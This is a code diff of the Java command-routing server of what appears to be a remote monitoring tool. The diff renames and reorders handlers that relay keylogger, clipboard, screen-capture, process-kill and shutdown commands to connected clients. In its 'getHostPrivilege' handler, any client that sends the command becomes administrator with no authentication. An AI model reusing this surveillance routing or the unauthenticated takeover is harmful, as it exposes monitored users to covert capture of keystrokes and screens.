@@ -18,17 +18,16 @@ public class Controller {
     private static final String PROPERTY_CLIENTS = "clients";
 
     public static void init() {
-        put(COMMAND_LOGIN, Controller::getLogin);
-        put(COMMAND_SHUTDOWN, Controller::shutdown);
-        put(COMMAND_PROCESS, Controller::getProcess);
         put(COMMAND_NOTIFICATION, Controller::notify);
-        put(COMMAND_DO_NOTHING, Controller::doNothing);
-        put(COMMAND_END_PROCESS, Controller::endProcess);
-        put(COMMAND_CLIPBOARD, Controller::getClipboard);
-        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
-        put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
-        put(COMMAND_MONITORING, Controller::getMonitoring);
-        put(COMMAND_GET_ALL_CLIENTS, Controller::getAllClients);
+        put(COMMAND_SHUTDOWN_CLIENT, Controller::shutdown);
+        put(COMMAND_CLIENT_MONITOR, Controller::getScreen);
+        put(COMMAND_GET_CLIENTS, Controller::getAllClients);
+        put(COMMAND_CLIENT_PROCESS, Controller::getProcess);
+        put(COMMAND_GET_HOST_PRIVILEGE, Controller::getHostPrivilege);
+        put(COMMAND_END_CLIENT_PROCESS, Controller::endProcess);
+        put(COMMAND_CLIENT_KEYLOGGER, Controller::getKeylogger);
+        put(COMMAND_CLIENT_CLIPBOARD, Controller::getClipboard);
+        put(COMMAND_CLIENT_SYSTEM_USAGE, Controller::getClientSystemUsage);
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
     }
 
@@ -40,16 +39,13 @@ public class Controller {
         Server.getHost().onSend(json.toString());
     }
 
-    private static void doNothing(JSON json, SocketModel sender) {
-    }
-
     private static void endProcess(JSON json, SocketModel sender) {
         onHostSend(sender, Server.getClientConnections().get(json.get(TO)), json.toString());
     }
 
     private static void getProcess(JSON json, SocketModel sender) {
         if (isHost(sender.getUUID())) {
-            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_PROCESS).json());
+            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_PROCESS).json());
             return;
         }
         Server.getHost().onSend(json.toString());
@@ -57,15 +53,16 @@ public class Controller {
 
     private static void getScreen(JSON json, SocketModel sender) {
         if (isHost(sender.getUUID())) {
-            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_SCREEN).json());
+            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_MONITOR).json());
             return;
         }
+        json.put(FORM, sender.getUUID());
         Server.getHost().onSend(json.toString());
     }
 
     private static void getKeylogger(JSON json, SocketModel sender) {
         if (isHost(sender.getUUID())) {
-            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_KEYLOGGER).json());
+            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_KEYLOGGER).json());
             return;
         }
         Server.getHost().onSend(json.toString());
@@ -73,17 +70,18 @@ public class Controller {
 
     private static void getClipboard(JSON json, SocketModel sender) {
         if (isHost(sender.getUUID())) {
-            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIPBOARD).json());
+            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_CLIPBOARD).json());
             return;
         }
         Server.getHost().onSend(json.toString());
     }
 
-    private static void getMonitoring(JSON json, SocketModel sender) {
+    private static void getClientSystemUsage(JSON json, SocketModel sender) {
         if (isHost(sender.getUUID())) {
-            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_MONITORING).json());
+            onHostSend(sender, Server.getClientConnections().get(json.get(TO)), new MessageModel(DEFAULT_SERVER_HOST, json.get(TO), COMMAND_CLIENT_SYSTEM_USAGE).json());
             return;
         }
+        json.put(FORM, sender.getUUID());
         Server.getHost().onSend(json.toString());
     }
     
@@ -94,7 +92,11 @@ public class Controller {
         }
         receiver.onSend(message);
     }
-    
+
+    private static void getAllClients(JSON json, SocketModel sender) {
+        sender.onSend(new MessageModel(DEFAULT_SERVER_HOST, sender.getUUID(), COMMAND_GET_CLIENTS).put(PROPERTY_CLIENTS, Server.getClientConnections().values()).json());
+    }
+
     private static void getClientSystemInfo(JSON json, SocketModel sender) {
         String uuid = sender.getUUID();
         ClientSocketModel client = Server.getClientConnections().get(uuid);
@@ -109,7 +111,7 @@ public class Controller {
         console.log("Client[" + uuid + "] updated system info!");
     }
 
-    private static void getLogin(JSON json, SocketModel sender) {
+    private static void getHostPrivilege(JSON json, SocketModel sender) {
         String uuid = sender.getUUID();
         Server.setHost(uuid);
         console.warn("Client[" + uuid + "] is now a Administrator");
@@ -117,10 +119,6 @@ public class Controller {
 
     private static void getSync(SocketModel sender) {
         sender.onSend(new MessageModel(DEFAULT_SERVER_HOST, sender.getUUID(), COMMAND_SYNC).put(PROPERTY_CLIENTS, Server.getClientConnections().values()).json());
-    }
-
-    private static void getAllClients(JSON json, SocketModel sender) {
-        sender.onSend(new MessageModel(DEFAULT_SERVER_HOST, sender.getUUID(), COMMAND_GET_ALL_CLIENTS).put(PROPERTY_CLIENTS, Server.getClientConnections().values()).json());
     }
 
     private static String getNotFoundController(JSON json, SocketModel sender) {
